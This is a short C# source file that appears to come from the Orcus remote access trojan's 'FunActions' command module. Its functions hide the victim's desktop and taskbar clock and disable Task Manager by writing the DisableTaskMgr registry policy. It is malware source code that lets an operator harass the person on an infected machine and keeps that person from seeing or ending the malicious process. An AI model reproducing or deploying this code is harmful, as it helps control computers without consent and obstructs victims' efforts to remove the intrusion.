using Microsoft.Win32;
using Orcus.Native;
using Orcus.Utilities;

namespace Orcus.Commands.FunActions;

internal static class WindowsModules
{
	public static void SetDesktopVisibility(bool visible)
	{
		NativeMethods.ShowWindow(WindowHelper.GetDesktopWindow(DesktopWindow.ProgMan), visible ? ShowWindowCommands.Show : ShowWindowCommands.Hide);
	}

	public static void SetClockVisibility(bool visible)
	{
		NativeMethods.ShowWindow(NativeMethods.GetDlgItem(NativeMethods.GetDlgItem(NativeMethods.FindWindow("Shell_TrayWnd", null), 303), 303), visible ? ShowWindowCommands.Show : ShowWindowCommands.Hide);
	}

	public static void SetTaskManager(bool enable)
	{
		using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		if (enable && registryKey != null && registryKey.GetValue("DisableTaskMgr") != null)
		{
			registryKey.DeleteValue("DisableTaskMgr");
		}
		else
		{
			registryKey.SetValue("DisableTaskMgr", "1");
		}
	}
}
